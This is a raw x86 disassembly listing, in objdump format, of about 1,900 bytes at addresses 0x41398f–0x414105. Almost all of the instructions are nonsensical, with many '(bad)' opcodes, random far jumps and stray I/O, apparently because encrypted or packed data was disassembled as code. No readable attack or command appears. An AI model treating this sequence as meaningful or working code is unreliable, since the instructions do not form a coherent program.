  41398f:	cwde   
  413990:	or     BYTE PTR ds:[esi-0x3b],0x36
  413995:	xchg   ebx,eax
  413996:	cmp    BYTE PTR [ebx-0x3ddc2cfd],al
  41399c:	adc    eax,0x94538515
  4139a1:	stc    
  4139a2:	dec    eax
  4139a3:	dec    eax
  4139a4:	(bad)  
  4139a5:	call   0x5afef700
  4139aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4139ab:	lahf   
  4139ac:	xor    eax,0x5fef9a81
  4139b1:	mov    ecx,0x836555d2
  4139b6:	lahf   
  4139b7:	leave  
  4139b8:	xchg   ebp,eax
  4139b9:	dec    ebx
  4139ba:	loop   0x4139e5
  4139bc:	pushf  
  4139bd:	test   DWORD PTR [ebx+0x5d153105],ecx
  4139c3:	aam    0x27
  4139c5:	fwait
  4139c6:	and    eax,0x385041db
  4139cb:	not    BYTE PTR [ecx-0x6b]
  4139ce:	jp     0x4139df
  4139d0:	sub    DWORD PTR [edi-0x7e9cf193],0x96d8e768
  4139da:	arpl   WORD PTR [ecx-0x2985b5ea],sp
  4139e0:	xchg   esp,eax
  4139e1:	push   ecx
  4139e2:	sub    dl,BYTE PTR [ecx-0x1910555d]
  4139e8:	adc    eax,0xd5e8d3a7
  4139ed:	jb     0x4139e2
  4139ef:	xchg   ecx,eax
  4139f0:	shl    BYTE PTR [ecx+edx*8+0x44],0x7
  4139f5:	fcmovnb st,st(3)
  4139f7:	sbb    bh,bl
  4139f9:	pop    esi
  4139fa:	scas   eax,DWORD PTR es:[edi]
  4139fb:	pop    ebx
  4139fc:	push   ds
  4139fd:	inc    edx
  4139fe:	xor    BYTE PTR [ebx-0x37892b89],dl
  413a04:	pop    ss
  413a05:	(bad)  
  413a06:	enter  0x1ad0,0x2
  413a0a:	call   0x324df828
  413a0f:	mov    dh,0x22
  413a11:	push   ds
  413a12:	push   ebx
  413a13:	rcl    DWORD PTR [edi+eiz*8-0x7b],0x28
  413a18:	lea    ebx,[eax+0x6c]
  413a1b:	sub    DWORD PTR [edi-0x73],edi
  413a1e:	ins    DWORD PTR es:[edi],dx
  413a1f:	scas   eax,DWORD PTR es:[edi]
  413a20:	scas   al,BYTE PTR es:[edi]
  413a21:	lods   al,BYTE PTR ds:[esi]
  413a22:	out    dx,eax
  413a23:	sbb    al,0xdc
  413a25:	call   0xf8c02502
  413a2a:	ror    BYTE PTR [edi+esi*2-0x6f09dd1c],0x12
  413a32:	sub    BYTE PTR [eax-0x1d7fed89],al
  413a38:	sti    
  413a39:	out    dx,al
  413a3a:	mov    bl,ch
  413a3c:	jge    0x413a1d
  413a3e:	je     0x413a64
  413a40:	xchg   edx,eax
  413a41:	or     ecx,edx
  413a43:	jns    0x413a70
  413a45:	ret    
  413a46:	stc    
  413a47:	cmp    DWORD PTR [eax+0x1feb3623],esi
  413a4d:	ror    BYTE PTR [edi+ecx*2+0x6f],cl
  413a51:	out    dx,al
  413a52:	test   BYTE PTR [esi-0x47a8a9c5],dl
  413a58:	mov    ss,edi
  413a5a:	aad    0xeb
  413a5c:	nop
  413a5d:	mov    ?,WORD PTR [esp+esi*2+0x52]
  413a61:	dec    esp
  413a62:	xchg   ecx,eax
  413a63:	mov    ds:0x98eea11,eax
  413a68:	arpl   WORD PTR [ebx],bp
  413a6a:	(bad)
  413a6d:	in     al,0x6b
  413a6f:	sbb    bl,BYTE PTR [eax-0x3d5fe6ae]
  413a75:	mov    ah,0x9a
  413a77:	and    DWORD PTR [edx],ebx
  413a79:	pop    eax
  413a7a:	in     al,dx
  413a7b:	mov    esp,edx
  413a7d:	ins    DWORD PTR es:[edi],dx
  413a7e:	out    0xdf,eax
  413a80:	jmp    0x5d7d:0x1320048c
  413a87:	imul   eax,DWORD PTR [esi+0x39],0xffffffa8
  413a8b:	dec    ebx
  413a8c:	fist   WORD PTR [ecx]
  413a8e:	pop    ds
  413a8f:	sti    
  413a90:	or     eax,0x3162e76a
  413a95:	outs   dx,BYTE PTR ds:[esi]
  413a96:	aad    0x36
  413a98:	je     0x413b0c
  413a9a:	int3   
  413a9b:	ja     0x413aff
  413a9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413a9e:	bound  eax,QWORD PTR [ebx-0x23e14339]
  413aa4:	jnp    0x413a5c
  413aa6:	fdivp  st(5),st
  413aa8:	div    BYTE PTR [edx]
  413aaa:	sub    edx,eax
  413aac:	mov    ebp,0x105baff3
  413ab1:	adc    eax,0xda4173fb
  413ab6:	xlat   BYTE PTR ds:[ebx]
  413ab7:	sbb    ecx,ecx
  413ab9:	push   DWORD PTR [ecx+0x5b8497fb]
  413abf:	retf   0x7d11
  413ac2:	pop    ss
  413ac3:	adc    bh,BYTE PTR [eax+0x2d96584c]
  413ac9:	enter  0x4025,0x90
  413acd:	popa   
  413ace:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413acf:	ror    bh,cl
  413ad1:	outs   dx,DWORD PTR ds:[esi]
  413ad2:	sub    bh,dh
  413ad4:	inc    eax
  413ad5:	hlt    
  413ad6:	aaa    
  413ad7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413ad8:	push   ebp
  413ad9:	pop    ecx
  413ada:	push   ecx
  413adb:	pop    ss
  413adc:	aad    0x3b
  413ade:	shl    BYTE PTR [ebp-0x68ba37cb],cl
  413ae4:	xlat   BYTE PTR ds:[ebx]
  413ae5:	fdiv   st,st(1)
  413ae7:	clc    
  413ae8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413ae9:	push   cs
  413aea:	repnz sbb BYTE PTR [eax],ah
  413aed:	and    ebp,ebx
  413aef:	xchg   edx,eax
  413af0:	mov    ds:0xf0a98bef,eax
  413af5:	int3   
  413af6:	shl    DWORD PTR [ecx+0x6eb13574],1
  413afc:	dec    edi
  413afd:	xchg   al,ah
  413aff:	xchg   ebp,eax
  413b00:	cmp    al,0xcd
  413b02:	test   BYTE PTR [esp+edx*8],cl
  413b05:	add    DWORD PTR [edx-0x5d7864b5],edi
  413b0b:	aad    0xb9
  413b0d:	inc    edx
  413b0e:	outs   dx,BYTE PTR ds:[esi]
  413b0f:	ins    BYTE PTR es:[edi],dx
  413b10:	cmp    DWORD PTR [ebx+0x26],ebp
  413b13:	in     al,dx
  413b14:	mul    DWORD PTR [ecx-0x87be4fa]
  413b1a:	fisttp DWORD PTR [ecx+0x767f8f38]
  413b20:	shl    BYTE PTR [eax-0x7d],cl
  413b23:	daa    
  413b24:	inc    esi
  413b25:	imul   esi,DWORD PTR [ecx-0x39],0x9aaf2c25
  413b2c:	mov    eax,0x79f2601b
  413b31:	ret    0xb2db
  413b34:	out    dx,eax
  413b35:	jge    0x413b5f
  413b37:	dec    ebp
  413b38:	pop    eax
  413b39:	loop   0x413b68
  413b3b:	jns    0x413aeb
  413b3d:	sub    BYTE PTR ds:0x83e0cc47,dh
  413b43:	jmp    0xcbbb:0x3fb97822
  413b4a:	outs   dx,DWORD PTR ds:[esi]
  413b4b:	sbb    DWORD PTR [edx],edx
  413b4d:	mov    ?,WORD PTR [ebx+0xd]
  413b50:	mov    bl,0xa0
  413b52:	pushf  
  413b53:	lods   eax,DWORD PTR ds:[esi]
  413b54:	pop    ecx
  413b55:	es aam 0xf9
  413b58:	test   eax,0x6196716b
  413b5d:	mov    ebp,0x28811b46
  413b62:	lock daa 
  413b64:	cld    
  413b65:	adc    DWORD PTR [ebx-0x7477f718],esi
  413b6b:	cwde   
  413b6c:	mov    es,WORD PTR [esi+0x2f8c032b]
  413b72:	add    BYTE PTR [ebx-0x588679c4],dl
  413b78:	xor    eax,eax
  413b7a:	sti    
  413b7b:	add    edi,DWORD PTR [edx-0x22]
  413b7e:	retf   
  413b7f:	inc    eax
  413b80:	outs   dx,DWORD PTR ds:[esi]
  413b81:	mov    edx,0x224eabe1
  413b86:	sbb    dl,dh
  413b88:	sbb    BYTE PTR [edx],bh
  413b8a:	jge    0x413b91
  413b8c:	cmp    eax,0xe2cd49e6
  413b91:	rol    DWORD PTR [edx],cl
  413b93:	shr    BYTE PTR [edx],cl
  413b95:	or     cl,al
  413b97:	outs   dx,DWORD PTR ds:[esi]
  413b98:	sbb    al,0xf3
  413b9a:	enter  0x3cf7,0x7
  413b9e:	fld    QWORD PTR [edi-0x32]
  413ba1:	dec    eax
  413ba2:	ret    0x2c9c
  413ba5:	test   BYTE PTR [edx+0x16],0xd8
  413ba9:	mov    ecx,DWORD PTR [eax+eiz*1]
  413bac:	retf   
  413bad:	nop
  413bae:	shl    BYTE PTR [edx],cl
  413bb0:	hlt    
  413bb1:	in     al,0xef
  413bb3:	push   ss
  413bb4:	shr    ebp,cl
  413bb6:	fs ins DWORD PTR es:[edi],dx
  413bb8:	icebp  
  413bb9:	xor    dl,BYTE PTR [edx-0x3c]
  413bbc:	sbb    edx,DWORD PTR [edx-0x424f3f89]
  413bc2:	jae    0x413bda
  413bc4:	loopne 0x413b6f
  413bc6:	mov    cl,0x4c
  413bc8:	fisub  DWORD PTR [edi-0x7e]
  413bcb:	dec    ebp
  413bcc:	mov    cl,0x69
  413bce:	std    
  413bcf:	stc    
  413bd0:	data16 loopne 0x413c31
  413bd3:	out    0xbf,al
  413bd5:	test   DWORD PTR [edx-0x2291d66d],ebp
  413bdb:	jecxz  0x413c3d
  413bdd:	iret   
  413bde:	xor    BYTE PTR [ebx+eiz*4-0x430fadfc],cl
  413be5:	push   eax
  413be6:	out    dx,eax
  413be7:	fcomp  DWORD PTR [edi+eax*8-0x49]
  413beb:	rcr    DWORD PTR [ebp+0x553b5b97],1
  413bf1:	or     al,0xa
  413bf3:	fmulp  st(3),st
  413bf5:	fiadd  DWORD PTR [eax+0x1996975]
  413bfb:	iret   
  413bfc:	cmp    eax,0x7e9f16b7
  413c01:	mov    DWORD PTR [edx],ecx
  413c03:	sti    
  413c04:	cdq    
  413c05:	(bad)  
  413c06:	sbb    DWORD PTR [edi+0x2d29d290],edi
  413c0c:	pushf  
  413c0d:	ja     0x413bb8
  413c0f:	cmp    DWORD PTR [ecx+eiz*8+0x6f],esi
  413c13:	add    al,0xba
  413c15:	lds    ebx,FWORD PTR [edx+0x501bdaa5]
  413c1b:	arpl   cx,bx
  413c1d:	jmp    0xeecb:0x5866d826
  413c24:	jb     0x413bd7
  413c26:	push   ecx
  413c27:	ret    
  413c28:	jns    0x413c2f
  413c2a:	leave  
  413c2b:	cmp    eax,0xccc532b
  413c30:	pop    esp
  413c31:	out    0x6a,eax
  413c33:	mov    DWORD PTR [ecx-0x3ea9dfe5],ebp
  413c39:	aad    0x62
  413c3b:	jmp    0x81fe:0xf33c3237
  413c42:	out    0x41,al
  413c44:	retf   
  413c45:	call   0x58893613
  413c4a:	scas   al,BYTE PTR es:[edi]
  413c4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413c4c:	aaa    
  413c4d:	call   0xdb7f2d60
  413c52:	and    al,0xa9
  413c54:	jle    0x413cb8
  413c56:	vpsubq xmm5,xmm0,XMMWORD PTR [esp+ecx*2-0x7b]
  413c5c:	test   DWORD PTR [edx-0x4],edx
  413c5f:	add    dh,BYTE PTR [edi+ebx*2+0xc]
  413c63:	xchg   ebx,eax
  413c64:	sub    edi,DWORD PTR [ebx-0x75]
  413c67:	inc    esi
  413c68:	mov    ecx,?
  413c6a:	dec    eax
  413c6b:	mov    dl,0x6a
  413c6d:	ds push ecx
  413c6f:	leave  
  413c70:	add    DWORD PTR [ebp+0x106f900f],eax
  413c76:	fnstcw WORD PTR [esi]
  413c78:	(bad)  
  413c7a:	and    eax,0xca601d6e
  413c7f:	or     ebp,esp
  413c81:	sar    BYTE PTR fs:[eax+0x72],0x86
  413c86:	stos   BYTE PTR es:[edi],al
  413c87:	shl    ch,1
  413c89:	into   
  413c8a:	(bad)  
  413c8b:	(bad)  
  413c8c:	test   BYTE PTR [edi+esi*1-0x1f],dh
  413c90:	popa   
  413c91:	add    al,cl
  413c93:	pop    esp
  413c94:	(bad)  
  413c95:	jmp    0x413c5f
  413c97:	(bad)  
  413c98:	rol    BYTE PTR [eax+0x458479b7],cl
  413c9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413c9f:	inc    edx
  413ca0:	out    0xa3,eax
  413ca2:	aad    0x8f
  413ca4:	add    eax,0xf19d1143
  413ca9:	repnz sub DWORD PTR [eax-0x75],0x42959004
  413cb1:	xor    ecx,DWORD PTR [ecx]
  413cb3:	test   al,0x9d
  413cb5:	sbb    cl,BYTE PTR [edx+0x6a2efb89]
  413cbb:	clc    
  413cbc:	(bad)  
  413cbd:	pop    ecx
  413cbe:	aam    0xa0
  413cc0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413cc1:	jo     0x413d2d
  413cc3:	fld    QWORD PTR [edi-0x4a]
  413cc6:	cmp    ch,dl
  413cc8:	adc    DWORD PTR [esi-0x30c7ffd6],0xffffffd3
  413ccf:	rcl    DWORD PTR [ecx+0x42ae6be5],1
  413cd5:	rol    BYTE PTR [ebp+0x50b29219],0x88
  413cdc:	xchg   ah,dl
  413cde:	inc    eax
  413cdf:	push   0x7c8d57eb
  413ce4:	jnp    0x413ccf
  413ce6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413ce7:	cmp    ch,BYTE PTR [bx+di-0x5c]
  413ceb:	fnstsw WORD PTR [edx-0x26d9216d]
  413cf1:	sbb    eax,0xc249ea29
  413cf6:	add    al,0x6a
  413cf8:	mov    dh,0xd3
  413cfa:	fldcw  WORD PTR [eax-0x53]
  413cfd:	push   ss
  413cfe:	lock icebp 
  413d00:	sub    al,0xb2
  413d02:	push   ecx
  413d03:	imul   ecx,DWORD PTR [edi-0x1aba81d8],0x8
  413d0a:	adc    esp,edi
  413d0c:	(bad)  
  413d0d:	(bad)  
  413d0e:	shl    DWORD PTR [eax+0x34905458],cl
  413d14:	imul   edi,ebp,0x50a728d4
  413d1a:	je     0x413cc1
  413d1c:	cli    
  413d1d:	mov    cl,0xa4
  413d1f:	dec    ecx
  413d20:	call   0x5a4d:0x6044964b
  413d27:	mov    WORD PTR [ebp-0x38],gs
  413d2a:	dec    esp
  413d2b:	ss push edi
  413d2d:	adc    eax,DWORD PTR [esi+0x6c]
  413d30:	adc    DWORD PTR ss:[ecx],ebp
  413d33:	xor    dl,BYTE PTR [edx-0x5f]
  413d36:	push   ebp
  413d37:	retf   
  413d38:	xor    ebx,DWORD PTR [edx+edx*2+0x64]
  413d3c:	push   ecx
  413d3d:	dec    edx
  413d3e:	or     bh,cl
  413d40:	stc    
  413d41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413d42:	repnz push esi
  413d44:	outs   dx,DWORD PTR ds:[esi]
  413d45:	jb     0x413d71
  413d47:	cmp    edx,DWORD PTR [ecx+0x0]
  413d4a:	clc    
  413d4b:	pushf  
  413d4c:	pop    ebp
  413d4d:	add    eax,0x22880259
  413d52:	ins    BYTE PTR es:[edi],dx
  413d53:	idiv   DWORD PTR [ecx+0x75]
  413d56:	das    
  413d57:	cmp    al,0x65
  413d59:	xor    DWORD PTR [ebx],edx
  413d5b:	mov    edx,0xc724f82d
  413d60:	mov    ebx,0x83a81483
  413d65:	pop    ebx
  413d66:	test   BYTE PTR [edi-0x536cc8e9],0x39
  413d6d:	sets   BYTE PTR [esi-0x6672229b]
  413d74:	repnz in eax,0x6b
  413d77:	int3   
  413d78:	push   esi
  413d79:	or     DWORD PTR [esi-0x4e363dc9],0x3
  413d80:	sub    eax,0x9b0e586d
  413d85:	push   eax
  413d86:	mov    cl,dl
  413d88:	xor    eax,0x6b88bd9
  413d8d:	enter  0x174c,0x43
  413d91:	out    0xcd,al
  413d93:	xchg   DWORD PTR [edx-0xfbe1b55],ebx
  413d99:	in     eax,0xad
  413d9b:	xchg   ecx,eax
  413d9c:	icebp  
  413d9d:	dec    edi
  413d9e:	adc    eax,esp
  413da0:	ins    BYTE PTR es:[edi],dx
  413da1:	inc    esi
  413da2:	adc    BYTE PTR gs:[ebp+0x56ae9f13],0x1a
  413daa:	jmp    0x5ac0:0xbbba5fb5
  413db1:	iret   
  413db2:	xchg   ecx,eax
  413db3:	mov    dh,0x82
  413db5:	dec    esi
  413db6:	pop    eax
  413db7:	or     DWORD PTR [esi],esp
  413db9:	xor    edx,DWORD PTR [edi+ecx*1]
  413dbc:	jmp    0x413d6f
  413dbe:	imul   ebp,DWORD PTR [edi],0xdf99adf0
  413dc4:	pop    ebx
  413dc5:	hlt    
  413dc6:	and    eax,esp
  413dc8:	add    BYTE PTR [esi],0x97
  413dcb:	mul    BYTE PTR [edx]
  413dcd:	push   esi
  413dce:	icebp  
  413dcf:	jo     0x413d94
  413dd1:	and    DWORD PTR [edx+0x1b],ecx
  413dd4:	mov    esp,0x87cf397d
  413dd9:	test   eax,0xd26ca05a
  413dde:	ins    DWORD PTR es:[edi],dx
  413ddf:	sbb    ebx,edx
  413de1:	dec    esi
  413de2:	inc    eax
  413de3:	imul   ebp,DWORD PTR [edx-0x51],0x85bda616
  413dea:	clc    
  413deb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413dec:	jns    0x413d88
  413dee:	in     eax,dx
  413def:	and    bl,BYTE PTR [edi+eiz*4-0x5fc4a2da]
  413df6:	sbb    edx,edi
  413df8:	(bad)  
  413df9:	imul   edx,DWORD PTR [ebx],0xa7ba19ad
  413dff:	mov    ss,WORD PTR [edx]
  413e01:	mov    ebx,0xd1b827c9
  413e06:	inc    esp
  413e07:	cwde   
  413e08:	ins    DWORD PTR es:[edi],dx
  413e09:	dec    edi
  413e0a:	test   al,0xcb
  413e0c:	inc    ebp
  413e0d:	test   esi,ebx
  413e0f:	mov    edi,0xe860f2ab
  413e14:	mov    BYTE PTR [edi],dh
  413e16:	jo     0x413e41
  413e18:	xchg   edx,eax
  413e19:	sub    eax,0x5ec47641
  413e1e:	mov    ecx,0xd124a454
  413e23:	sub    eax,0x8ad3b8d3
  413e28:	jecxz  0x413e21
  413e2a:	xchg   ebp,eax
  413e2b:	sahf   
  413e2c:	(bad)  
  413e2e:	cli    
  413e2f:	lods   al,BYTE PTR ds:[esi]
  413e30:	hlt    
  413e31:	or     BYTE PTR ds:0x7f97669e,dl
  413e37:	lds    ebp,FWORD PTR [edi+0x79]
  413e3a:	mov    dh,0xbb
  413e3c:	sbb    BYTE PTR [edx+eax*8+0x5c],dh
  413e40:	xor    bl,BYTE PTR [esi-0x58]
  413e43:	retf   0xc826
  413e46:	fld    TBYTE PTR [edx+0x45a55fe6]
  413e4c:	push   ebx
  413e4d:	std    
  413e4e:	js     0x413ec1
  413e50:	arpl   WORD PTR [ebp-0x40],cx
  413e53:	pop    esp
  413e54:	(bad)  
  413e55:	push   es
  413e56:	inc    esp
  413e57:	push   cs
  413e58:	addr16 jle 0x413e7c
  413e5b:	js     0x413e7d
  413e5d:	fld    QWORD PTR [esi-0x213d43cf]
  413e63:	push   es
  413e64:	cli    
  413e65:	pop    ebx
  413e66:	adc    DWORD PTR [edx],esi
  413e68:	stos   BYTE PTR es:[edi],al
  413e69:	cmc    
  413e6a:	fwait
  413e6b:	mov    eax,ds:0x60cb811f
  413e70:	push   esi
  413e71:	cli    
  413e72:	and    al,0xd6
  413e74:	adc    DWORD PTR [esi],eax
  413e76:	xor    BYTE PTR [ebx],0x3c
  413e79:	add    ebp,DWORD PTR [ebx]
  413e7b:	mov    WORD PTR [esi],ss
  413e7d:	fwait
  413e7e:	sbb    esi,DWORD PTR [edx+0xb]
  413e81:	sub    cl,BYTE PTR fs:[esi+0x11b38a79]
  413e88:	mov    BYTE PTR [edi+0x7],bl
  413e8b:	ins    DWORD PTR es:[edi],dx
  413e8c:	js     0x413e5e
  413e8e:	cwde   
  413e8f:	(bad)  
  413e90:	pop    edx
  413e91:	add    al,0x87
  413e93:	fwait
  413e94:	adc    bh,BYTE PTR [edi+0x22dcf00b]
  413e9a:	mov    ecx,0x9801cc9b
  413e9f:	(bad)  
  413ea1:	push   esp
  413ea2:	push   ss
  413ea3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413ea4:	xor    eax,0x96a0a096
  413ea9:	cmp    BYTE PTR [ecx+0x13],0xd3
  413ead:	pop    edx
  413eae:	lods   eax,DWORD PTR ds:[esi]
  413eaf:	test   BYTE PTR [ecx+0x3ceca121],bh
  413eb5:	adc    ch,al
  413eb7:	mov    ds:0x6a5eb141,eax
  413ebc:	jno    0x413e4e
  413ebe:	xchg   ebx,eax
  413ebf:	outs   dx,DWORD PTR ds:[esi]
  413ec0:	sub    al,BYTE PTR [edi-0x5f5439b6]
  413ec6:	push   ecx
  413ec7:	aad    0xc7
  413ec9:	rcr    BYTE PTR [ecx+0x73],1
  413ecc:	mov    bh,bl
  413ece:	gs add ebp,edi
  413ed1:	aad    0x52
  413ed3:	sub    ecx,0x0
  413ed6:	ins    DWORD PTR es:[edi],dx
  413ed7:	test   BYTE PTR [esi-0x3183138a],cl
  413edd:	add    al,0x11
  413edf:	inc    edi
  413ee0:	inc    ecx
  413ee1:	jnp    0x413f19
  413ee3:	iret   
  413ee4:	dec    BYTE PTR [esi-0x79ffda2f]
  413eea:	xchg   BYTE PTR ds:0xf6d1ff80,cl
  413ef0:	xchg   edx,eax
  413ef1:	mov    DWORD PTR ds:0x5175ab4a,ebp
  413ef7:	mov    ch,0x68
  413ef9:	sub    BYTE PTR [eax+edx*8-0x7],0xd6
  413efe:	jmp    0x413f0b
  413f00:	pop    edi
  413f01:	mov    ecx,0x2f3dce3c
  413f06:	pop    ecx
  413f07:	pop    ebp
  413f08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f09:	lock mov ah,0x4e
  413f0c:	outs   dx,BYTE PTR ds:[esi]
  413f0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f0e:	ror    BYTE PTR [ebx+0x6826770c],cl
  413f14:	stos   BYTE PTR es:[edi],al
  413f15:	adc    al,0xbd
  413f17:	addr16 cmp al,0x8e
  413f1a:	and    ah,BYTE PTR [edx-0x66]
  413f1d:	fwait
  413f1e:	sbb    BYTE PTR [edi],ch
  413f20:	xor    eax,ebp
  413f22:	xchg   esp,eax
  413f23:	lea    esi,[eax]
  413f25:	and    al,0x47
  413f27:	lds    eax,FWORD PTR [edx+0x3f]
  413f2a:	and    al,0x84
  413f2c:	mov    dh,0xb5
  413f2e:	lahf   
  413f2f:	int3   
  413f30:	rol    DWORD PTR [eax+eax*4-0x1b],1
  413f34:	inc    edx
  413f35:	iret   
  413f36:	imul   ecx,DWORD PTR [edx+0x28c35da2],0x68
  413f3d:	pop    edx
  413f3e:	fs jb  0x413fa9
  413f41:	les    ebx,FWORD PTR [ecx]
  413f43:	addr16 popa 
  413f45:	cmp    al,0x6f
  413f47:	jo     0x413fa7
  413f49:	dec    edx
  413f4a:	mov    dl,0x6f
  413f4c:	sbb    eax,0x18fd1fcc
  413f51:	dec    edi
  413f52:	or     eax,edx
  413f54:	push   ecx
  413f55:	mov    eax,0x2467d0cf
  413f5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f5b:	in     al,dx
  413f5c:	push   esi
  413f5d:	pop    ebx
  413f5e:	imul   edi,DWORD PTR ds:0x18dc3929,0xa
  413f65:	fdivr  QWORD PTR [ebx-0x646e896f]
  413f6b:	adc    edx,DWORD PTR [ebp+0x27ce34e4]
  413f71:	mov    esi,0x6e7cc085
  413f76:	ins    BYTE PTR es:[edi],dx
  413f77:	cwde   
  413f78:	dec    edi
  413f79:	xchg   edx,eax
  413f7a:	sub    DWORD PTR [eax-0x2f],esp
  413f7d:	js     0x413f13
  413f7f:	xchg   esp,eax
  413f80:	ds daa 
  413f82:	aam    0x22
  413f84:	jns    0x413fe8
  413f86:	popa   
  413f87:	imul   BYTE PTR [ecx-0x7b]
  413f8a:	(bad)  
  413f8b:	xor    ch,cl
  413f8d:	xor    dh,BYTE PTR [edx]
  413f8f:	cld    
  413f90:	cld    
  413f91:	loop   0x413f1b
  413f93:	cmp    al,0x1f
  413f95:	jle    0x413faf
  413f97:	(bad)  
  413f98:	(bad)  
  413f99:	cmp    eax,0x642c9806
  413f9e:	mov    ecx,0x32b87b51
  413fa3:	loopne 0x413fc2
  413fa5:	jle    0x413f74
  413fa7:	xchg   edx,eax
  413fa8:	mov    esi,0x2b0df5b7
  413fad:	fstp   QWORD PTR [edx-0x20715766]
  413fb3:	aaa    
  413fb4:	fcom   QWORD PTR [eax+esi*1+0x8]
  413fb8:	lods   al,BYTE PTR ds:[esi]
  413fb9:	or     BYTE PTR [esp+ebp*8],al
  413fbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413fbd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413fbe:	and    BYTE PTR [edx+0x1a],bl
  413fc1:	iret   
  413fc2:	out    dx,al
  413fc3:	aad    0x47
  413fc5:	mov    bh,0xa
  413fc7:	cmc    
  413fc8:	stos   DWORD PTR es:[edi],eax
  413fc9:	pop    edi
  413fca:	jb     0x414001
  413fcc:	hlt    
  413fcd:	xchg   ebx,eax
  413fce:	add    eax,0x7d9be95e
  413fd3:	out    0x1a,al
  413fd5:	stc    
  413fd6:	sub    dl,BYTE PTR [ecx-0x78]
  413fd9:	mov    dh,0x5
  413fdb:	jmp    DWORD PTR [eax+0x6f4ab991]
  413fe1:	mov    ch,0x93
  413fe3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413fe4:	fisttp WORD PTR [edi]
  413fe6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413fe7:	neg    edi
  413fe9:	xchg   ebp,eax
  413fea:	(bad)  
  413fec:	inc    ecx
  413fed:	xchg   ebp,eax
  413fee:	jae    0x413f8e
  413ff0:	xor    al,0xa5
  413ff2:	lock push edx
  413ff4:	(bad)  
  413ff5:	mov    DWORD PTR [edx+0x6b1c6ee9],0x6981c3e9
  413fff:	cmp    al,0x21
  414001:	sar    DWORD PTR [ebx],1
  414003:	outs   dx,BYTE PTR ds:[esi]
  414004:	pop    esi
  414005:	cmp    al,0x2a
  414007:	sbb    cl,BYTE PTR [esi+eax*1+0xe6879a4]
  41400e:	enter  0x3477,0x4d
  414012:	mov    edi,0xdc083ade
  414017:	fwait
  414018:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414019:	and    ch,bl
  41401b:	outs   dx,DWORD PTR ds:[esi]
  41401c:	add    ebp,DWORD PTR [edi-0xd]
  41401f:	lds    eax,FWORD PTR [edi+0x12]
  414022:	inc    ecx
  414023:	pop    eax
  414024:	xchg   ebx,eax
  414025:	dec    edi
  414026:	mov    al,0x57
  414028:	addr16 inc esp
  41402a:	jge    0x414004
  41402c:	pop    es
  41402d:	cmp    ah,BYTE PTR [ebx+ebx*8-0x6d]
  414031:	enter  0x2038,0x8
  414035:	xchg   ebx,eax
  414036:	daa    
  414037:	cmp    al,0x2e
  414039:	push   0xb69a095d
  41403e:	xchg   ecx,eax
  41403f:	(bad)  
  414040:	lds    ecx,FWORD PTR ds:0x14b33b6
  414046:	pop    eax
  414047:	ror    bh,cl
  414049:	inc    ebx
  41404a:	xor    DWORD PTR [ebx-0x3f98b7e7],0x12fa61f1
  414054:	and    DWORD PTR [ecx-0x111437d8],ecx
  41405a:	adc    dh,bl
  41405c:	leave  
  41405d:	cmp    esp,ebx
  41405f:	mov    bh,0x5f
  414061:	test   DWORD PTR [edx],0x6f126b7
  414067:	pop    edi
  414068:	sti    
  414069:	ucomiss xmm2,DWORD PTR [ebp-0x25e3cdd0]
  414070:	push   esp
  414071:	xchg   edi,eax
  414072:	inc    esi
  414073:	xchg   ecx,eax
  414074:	mov    ds:0x83278714,al
  414079:	mov    ah,0x7d
  41407b:	aaa    
  41407c:	xchg   DWORD PTR [ebx+0xa],edi
  41407f:	inc    eax
  414080:	and    BYTE PTR [esi-0x4e],al
  414083:	in     eax,dx
  414084:	jne    0x41408e
  414086:	push   edi
  414087:	and    al,0x11
  414089:	push   ss
  41408a:	test   BYTE PTR [ecx+0x625e580e],bh
  414090:	gs pop ebp
  414092:	ins    BYTE PTR es:[edi],dx
  414093:	adc    dl,BYTE PTR [edi]
  414095:	sub    al,0x8
  414097:	std    
  414098:	pop    ebp
  414099:	pop    edi
  41409a:	cmp    DWORD PTR [edx],ebp
  41409c:	stos   BYTE PTR es:[edi],al
  41409d:	(bad)
  4140a1:	clc    
  4140a2:	sbb    ah,BYTE PTR [ebx+0x771bcbc8]
  4140a8:	ins    BYTE PTR es:[edi],dx
  4140a9:	das    
  4140aa:	dec    esi
  4140ab:	push   cs
  4140ac:	enter  0xee3c,0x4c
  4140b0:	mov    eax,ds:0x56852c4
  4140b5:	mov    eax,ds:0x7183aee0
  4140ba:	ja     0x414049
  4140bc:	or     BYTE PTR [edi-0xe],dh
  4140bf:	push   ebp
  4140c0:	mov    al,ds:0x1bf4db26
  4140c5:	or     ah,BYTE PTR [eax-0x53ce2e2d]
  4140cb:	adc    al,0xac
  4140cd:	xor    DWORD PTR [ecx-0x1c],esp
  4140d0:	in     al,0x49
  4140d2:	and    DWORD PTR [esi-0x48],edx
  4140d5:	scas   eax,DWORD PTR es:[edi]
  4140d6:	or     BYTE PTR [ecx+0x7],dl
  4140d9:	and    DWORD PTR ds:0x428e2b,ebx
  4140df:	xor    ecx,eax
  4140e1:	mov    esi,0x3272f6
  4140e6:	adc    DWORD PTR ds:0x428e4b,0x428e8b
  4140f0:	push   edi
  4140f1:	add    ecx,esi
  4140f3:	jmp    0x414117
  4140f8:	mov    DWORD PTR ds:0x428e8b,0x6fd6
  414102:	mov    dl,BYTE PTR [ebp-0x1]
  414105:	mov    BYTE PTR [ebp+ecx*1-0x9c],dl
